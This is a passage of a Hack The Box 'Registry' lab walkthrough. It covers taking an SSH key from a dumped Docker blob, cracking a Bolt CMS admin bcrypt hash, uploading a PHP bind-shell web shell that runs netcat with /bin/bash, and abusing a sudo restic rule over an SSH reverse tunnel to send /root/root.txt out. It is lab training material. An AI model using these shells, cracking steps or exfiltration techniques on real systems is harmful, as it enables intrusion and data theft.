sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee
sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c
sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7
sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0
sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a
sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797
sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff

[*] Dumping blob sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b to ./302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b/302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.tar.gz
	[+] Log File: ./302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.log
	[*] Extracting dumped blob

[*] Dumping blob sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee to ./3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee/3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee.tar.gz
	[+] Log File: ./3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee.log
	[*] Extracting dumped blob

[*] Dumping blob sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c to ./02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c/02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c.tar.gz
	[+] Log File: ./02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c.log
	[*] Extracting dumped blob

[*] Dumping blob sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7 to ./c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7/c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7.tar.gz
	[+] Log File: ./c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7.log
	[*] Extracting dumped blob

[*] Dumping blob sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791 to ./2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791.tar.gz
	[+] Log File: ./2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791.log
	[*] Extracting dumped blob

[*] Dumping blob sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 to ./a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4/a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.tar.gz
	[+] Log File: ./a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.log
	[*] Extracting dumped blob

[*] Dumping blob sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0 to ./f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0/f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0.tar.gz
	[+] Log File: ./f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0.log
	[*] Extracting dumped blob

[*] Dumping blob sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a to ./d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a/d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a.tar.gz
	[+] Log File: ./d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a.log
	[*] Extracting dumped blob

[*] Dumping blob sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797 to ./8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797/8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797.tar.gz
	[+] Log File: ./8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797.log
	[*] Extracting dumped blob

[*] Dumping blob sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff to ./f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff/f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff.tar.gz
	[+] Log File: ./f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff.log
	[*] Extracting dumped blob

*** ENJOY! ***
```

While digging through the blob directories, we found the following:

1) SSH key pairs in the 2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/root/.ssh/ directory.

2) Some scripts of interest (01-ssh.sh and 02-ssh.sh) under 2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/etc/profile.d/

Inspecting the second scripts gives us the passphrase for the id_rsa private key we found. Let's try these two:

```
kali@back0ff:~/Documents/HTB-Labs/Registry$ ssh -i /home/kali/Documents/HTB-Labs/Registry/2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/root/.ssh/id_rsa bolt@registry.htb
Enter passphrase for key '/home/kali/Documents/HTB-Labs/Registry/2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Wed Mar 25 01:18:23 UTC 2020

  System load:  0.0               Users logged in:                0
  Usage of /:   5.6% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 21%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    154
Last login: Mon Oct 21 10:31:48 2019 from 10.10.14.2
bolt@bolt:~$ id
uid=1001(bolt) gid=1001(bolt) groups=1001(bolt)
bolt@bolt:~$ pwd
/home/bolt
bolt@bolt:~$ ls
user.txt
bolt@bolt:~$ cat user.txt 
ytc0y**********************3ywzi
```
Listing files in the bolt's user home directory gives us the user flag file **(WOOT WOOT!)**


## Privilege Escalation

Well, so far we tried finding any files/directories where the bolt group has access to but not much came up, but if we try what files are world-readable under /var we see some interesting things:

Basically we can read to the index.php file in the install directory inside /var/www/html and also there seems to be another directory called bolt(?!) where we can read basically all the files inside.
```
bolt@bolt:~$ find /var -type f -perm -o=r 2> /dev/null
/var/www/html/install/index.php
/var/www/html/bolt/
.
.
.
/var/www/html/bolt/.htaccess
.
.
.
/var/www/html/backup.php
/var/www/html/index.nginx-debian.html
/var/www/html/index.html
.
.
.
/var/backups/bolt.tgz
```

These files look like quite something and by looking at the changelog.md, we find Bolt related to Bolt CMS and its database uses SQLITE where it's stored in bolt/app/database/bolt.db.

The first lines gives us the version of Bolt so we can look at some exploits if needed, but we need to also move bolt.db locally to use SQLite Browser and find out what is in there
```
bolt@bolt:/var/www/html/bolt$ cat changelog.md | grep Bolt
Changelog for Bolt 3.x
Bolt 3.6.4
 - Fixed asset url generation for Bolt install in subfolder. [#7725](https://github.com/bolt/bolt/pull/7725)

bolt@bolt:/var/www/html/bolt$ ls -ltr app/database/
total 288
-rw-r--r-- 1 www-data www-data 294912 Oct 21 10:41 bolt.db
```

Retrieve bolt.db using SCP.
```
kali@back0ff:~/Documents/HTB-Labs/Registry$ scp -i /home/kali/Documents/HTB-Labs/Registry/2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/root/.ssh/id_rsa bolt@registry.htb:/var/www/html/bolt/app/database/bolt.db
```
Once you retrieve it, open it locally SQLite Browser, try and see what items of interest like the users table could be found and if any create a new file containing the credentials found: sqlite_hash.lst.

```
kali@back0ff:~/Documents/HTB-Labs/Registry$ cat sqlite_hash.lst 
admin:$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK
```

At this point, we should try and crack these credentials using JohnTheRipper:
```
kali@back0ff:~/Documents/HTB-Labs/Registry$ john --wordlist=/usr/share/wordlists/rockyou.txt sqlite_hash.lst > sqlite_creds.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1g 0:00:00:03 DONE (2020-03-24 22:13) 0.2688g/s 96.77p/s 96.77c/s 96.77C/s strawberry..brianna
Use the "--show" option to display all of the cracked passwords reliably
Session completed
kali@back0ff:~/Documents/HTB-Labs/Registry$ cat sqlite_creds.txt 
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
strawberry       (admin)
```
**WOOT WOOT! We have now credentials to access Bolt CMS.**

Let's try and enumerate web directories and php files so we can't find out how to access BOLT CMS from this box.
```
kali@back0ff:~/Documents/HTB-Labs/Registry$ gobuster dir -u http://registry.htb/bolt/ -w /usr/share/wordlists/dirb/big.txt -k -t 50 --timeout 20s -x php --wildcard
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://registry.htb/bolt/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        20s
===============================================================
2020/03/24 22:17:32 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/app (Status: 301)
/extensions (Status: 301)
/files (Status: 301)
/index.php (Status: 200)
/src (Status: 301)
/tests (Status: 301)
/theme (Status: 301)
/vendor (Status: 301)
===============================================================
2020/03/24 22:19:27 Finished
===============================================================
```
The *index.php* page should give us (possibly) a login page. This doesn't give us much, but as BOLT CMS is deployed under /var/www/html/bolt, it is possible we are looking at this incorrectly. Looking at BOLT CMS documentation, the login should be under /bolt, but it isn't the case. Let's do a test:

```
kali@back0ff:~/Documents/HTB-Labs/Registry$ curl -v -X GET -k https://registry.htb/bolt/bolt
Note: Unnecessary use of -X or --request, GET is already inferred.
*   Trying 10.10.10.159:443...
* TCP_NODELAY set
* Connected to registry.htb (10.10.10.159) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
* ALPN, server accepted to use http/1.1
* Server certificate:
*  subject: CN=docker.registry.htb
*  start date: May  6 21:14:35 2019 GMT
*  expire date: May  3 21:14:35 2029 GMT
*  issuer: CN=Registry
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
> GET /bolt/bolt HTTP/1.1
> Host: registry.htb
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Server: nginx/1.14.0 (Ubuntu)
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Cache-Control: no-cache
< Date: Wed, 25 Mar 2020 02:25:57 GMT
< Location: /bolt/bolt/login
< X-Frame-Options: SAMEORIGIN
< Frame-Options: SAMEORIGIN
< X-Debug-Token: 41b279
< Set-Cookie: bolt_session_d5575a759f2eb78cbf8e75d8017c193b=7d42ae1674eb87321e43d74957; expires=Wed, 08-Apr-2020 02:25:57 GMT; Max-Age=1209600; path=/bolt/; HttpOnly
< Strict-Transport-Security: max-age=63072000; includeSubdomains
< X-Frame-Options: DENY
< X-Content-Type-Options: nosniff
< 
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url=/bolt/bolt/login" />

        <title>Redirecting to /bolt/bolt/login</title>
    </head>
    <body>
        Redirecting to <a href="/bolt/bolt/login">/bolt/bolt/login</a>.
    </body>
* Connection #0 to host registry.htb left intact
</html>
kali@back0ff:~/Documents/HTB-Labs/Registry$
```

My guess was right so let's access the CMS through the browser.

While looking briefly in the CMS, I noticed File Management is up. After doing some check-ups we notice php files cannot be uploaded, and anything we upload normally goes away (gets deleted) very quickly, but if we upload any files as templates, they stay in perfectly.

One place to check is the configuration (Main Configuration), we can find that the file extensions to upload can be modified (**line 240**), so we can add php and in a different tab, we can refresh (Ctrl+F5) twice and upload a simple shell by opening a port we can bind to, and in another tab access this shell. The sample shell to use is:
```
rce2.php:
<?php
    system("nc.traditional -lvp 4444 -e /bin/bash")
?>
```

**From testing, it's worth noting that outbound communication is restricted. Let's keep this in mind.

Add the php file extension, upload the rce2.php file and quickly run netcat to registry.htb on port TCP4444 in a **NEW** terminal windows and try to connect.

When connecting:
```
kali@back0ff:~/Documents/HTB-Labs/Registry$ nc -v registry.htb 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.10.159:4444.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
/var/www/html/bolt/theme
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@bolt:~/html/bolt/theme$ 
```

Let's run *sudo -l* to check on what we can run as sudo:
```
www-data@bolt:~/html/bolt/theme$ sudo -l
sudo -l
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
www-data@bolt:~/html/bolt/theme$ 
```
## Data Exfiltration

Something else we need to look at, restic for backups. While looking into this, we found out we must set a restic server locally and initialize the repository (see the resources section).

This whole process tells me one way we can approach this is by "exfiltrating data" from registry.htb. We can't do anything else here other than running the restic backup command on anything.

Let's setup the restic server (*rest-server*) in a separate terminal window, locally:
```
kali@back0ff:~/Documents/HTB-Labs/Registry$ rest-server --listen 0.0.0.0:8000 --path /home/kali/Documents/HTB-Labs/Registry --no-auth
Data directory: /home/kali/Documents/HTB-Labs/Registry
Authentication disabled
Private repositories disabled
Starting server on 0.0.0.0:8000

kali@back0ff:~/Documents/HTB-Labs/Registry$ restic init -r rest:http://0.0.0.0:8000/
enter password for new repository: 
enter password again: 
created restic repository afc16c9776 at rest:http://0.0.0.0:8000/

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```

Having done this, if we try to run the backup command, we cannot connect to the rest-server on TCP 8000. Remember we can't connect outbound from registry.htb to almost anything

At this point, we could also attempt to do SSH Remote Port Forwarding to bind a new service to registry.htb from a **NEW** terminal window:

**SYNTAX:** 
```ssh -R RemotePort:localhost:RestPort -i bolt_id_rsa bolt@registry.htb```

Let's move forward and try this:
```
kali@back0ff:~/Documents/HTB-Labs/Registry$ ssh -R 61234:localhost:8000 -i /home/kali/Documents/HTB-Labs/Registry/2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/root/.ssh/id_rsa bolt@registry.htb

Enter passphrase for key '/home/kali/Documents/HTB-Labs/Registry/2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Wed Mar 11 01:16:08 UTC 2020

  System load:  0.0               Users logged in:                1
  Usage of /:   5.6% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 43%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    165
Last login: Wed Mar 11 01:06:02 2020 from 10.10.14.49
bolt@bolt:~$ 
```

Before we do anything let's check on what registry.htb is listening to as remote port forwarding will open TCP 61234 through SSH which is allowed.
```
bolt@bolt:~$ netstat -antpl
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:61234         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 10.10.10.159:4444       10.10.14.49:34810       ESTABLISHED -                   
tcp        0      0 10.10.10.159:22         10.10.14.36:49646       ESTABLISHED -                   
tcp        0    324 10.10.10.159:22         10.10.14.49:48010       ESTABLISHED -                   
tcp        0      0 10.10.10.159:22         10.10.14.49:48784       ESTABLISHED -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:61234               :::*                    LISTEN      -                   
```
As TCP 61234 is now being used by registry.htb, rest-server is running on TCP 8000 on the localhost, let try and run restic from registry.htb as www-data and try to exfiltrate the root.txt file using the port opened previous through SSH Remote Port Forwarding.
```
www-data@bolt:~/html/bolt/theme$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:61234/ /root/root.txt
<ckup -r rest:http://127.0.0.1:61234/ /root/root.txt
enter password for repository: <rest_repo_passwd>

password is correct
found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
scan [/root/root.txt]
scanned 0 directories, 1 files in 0:00
[0:00] 100.00%  33B / 33B  1 / 1 items  0 errors  ETA 0:00 
duration: 0:00
snapshot 3a378c88 saved
www-data@bolt:~/html/bolt/theme$ 
```

**AND we were successful at this, but not done yet!**

After doing all this, we now need to restore the "backup" of the root.txt file locally so we can access the root flag.
```
kali@back0ff:~/Documents/HTB-Labs/Registry$ restic restore 3a378c88 -r rest:http://127.0.0.1:8000 --target .
enter password for repository: 
repository 5966aab0 opened successfully, password is correct
restoring <Snapshot 3a378c88 of [/root/root.txt] at 2020-03-11 01:18:58.991866815 +0000 UTC by root@bolt> to .
kali@back0ff:~/Documents/HTB-Labs/Registry$ cat root.txt 
ntrkz**********************kztgw
```
**AND WE GOT THE ROOT FLAG!!**
